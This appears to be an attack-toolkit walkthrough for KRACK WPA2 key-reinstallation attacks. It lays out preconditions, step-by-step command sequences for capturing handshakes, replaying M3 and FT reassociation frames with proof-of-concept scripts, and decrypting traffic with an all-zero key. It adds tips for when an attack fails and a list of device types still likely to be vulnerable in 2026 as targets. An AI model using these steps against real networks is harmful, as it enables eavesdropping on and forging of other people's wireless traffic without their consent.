# KRACK — walkthrough

Reach for this when the target is an unpatched wpa_supplicant on a
legacy embedded stack. Modern flagship OSes are patched. The bar is
"is this device < ~2018 and never updated."

## Preconditions

- Target client with WPA2 supplicant vulnerable to at least one
  CVE-2017-13077..13088.
- Multi-Channel MitM setup (see `mc-mitm/walkthrough.md`).
- Monitor+injection interface on the attacker.

## Path A — Client PTK reinstall via M3 replay (CVE-2017-13077)

The classic KRACK. Set up MC-MitM, wait for the target to complete
a 4-way handshake, then replay M3 back to the client.

```
# 1. MC-MitM setup — see mc-mitm/walkthrough.md.
#    Clone SSID+BSSID on a different channel; victim roams.

# 2. Capture the 4-way handshake between real AP and victim.
airodump-ng -c <original-channel> --bssid AA:BB:CC:DD:EE:FF \
            -w /tmp/krack wlan1mon

# 3. Once M3 is captured, block the M4 ACK to the AP and replay
#    M3 to the client.
python3 krack-poc-vanhoef.py --ap AA:BB:CC:DD:EE:FF \
                             --client 11:22:33:44:55:66

# 4. Client reinstalls PTK; nonce counter resets.
# 5. From this point, captured data frames can be decrypted or
#    forged, depending on cipher (CCMP = decrypt; GCMP = forge).
```

Vanhoef's `krackattacks-scripts` (2017 PoC repo) is the canonical
tool. It automates the MC-MitM channel selection and M3 replay.

## Path B — Linux/Android all-zero PTK special case (CVE-2017-13077 + wpa_supplicant ≤ 2.6)

On old wpa_supplicant, the PTK is reinstalled as **all zeroes**.
No decryption work needed — subsequent frames encrypt with a zero key.

```
# Same setup as Path A.
# After the reinstall triggers, decrypt with tk = 32 zero bytes.
tshark -r /tmp/krack.pcapng \
  -o "wlan.enable_decryption:TRUE" \
  -o "uat:80211_keys:\"tk\",\"00000000000000000000000000000000\""
```

This is the same primitive as Kr00k (all-zero encryption key) but
triggered by a different bug. Not the same set of vulnerable
clients — KRACK targets old wpa_supplicant; Kr00k targets Broadcom/
Cypress/QCA silicon.

## Path C — FT reassoc key reinstall (CVE-2017-13082)

AP side. When a client roams under 802.11r Fast Transition, the AP
reinstalls the PTK on receipt of a reassoc request. Replaying the
reassoc lets the attacker force nonce reuse on the AP side.

```
# 1. Identify FT-capable AP (MDE in beacon).
# 2. Wait for or force a natural roam.
# 3. Capture the reassoc; replay it.
python3 krack-ft-reassoc.py --ap AA:BB:CC:DD:EE:FF ...
```

## Path D — Group-key reinstall (CVE-2017-13080, 13081)

Client-side. GTK reinstalled via replay of group-key handshake M1.
Enables replay of broadcast frames for the affected group.

## Failure modes

- **Target is patched.** All modern flagship OSes (iOS 11+, Android
  9+, Windows 10 build 1709+, most Linux distros post-2018) have
  fixes. Confirm target OS/build before firing.
- **MC-MitM setup fails.** Victim doesn't roam to your clone. RSSI
  or channel choice issue. See `mc-mitm/walkthrough.md`.
- **PMF-required target.** M3 replay is protected. KRACK reduces to
  the FT/WNM variants (13082, 13087, 13088) — narrower vulnerable
  population.
- **Vanhoef's PoC repo depends on old python2 / hostapd branch.**
  Kali maintains a working fork; check pinned versions.

## 2026-target expectations

Vulnerable population in 2026:

- **Old ESP32-family IoT** — until firmware 4.x, some wpa_supplicant
  forks lagged the fix.
- **End-of-life embedded** — industrial sensors, older WiFi cameras
  (some Ring/Wyze/Nest generations).
- **Cheap OEM routers on unsupported firmware** — the vulnerable
  side here is the *AP*, not the client (Path C / FT variant).

## Cite

- Vanhoef & Piessens 2017 — KRACK (ACM CCS).
- krackattacks-scripts GitHub (Vanhoef).
- CVE-2017-13077..13088.
- attacks.json: `krack-client-key-reinstall`,
  `krack-linux-all-zero-ptk`, `krack-ft-reassoc`,
  `krack-groupkey-reinstall`, `krack-groupkey-broadcast-replay`,
  `krack-wnm-reinstall`.
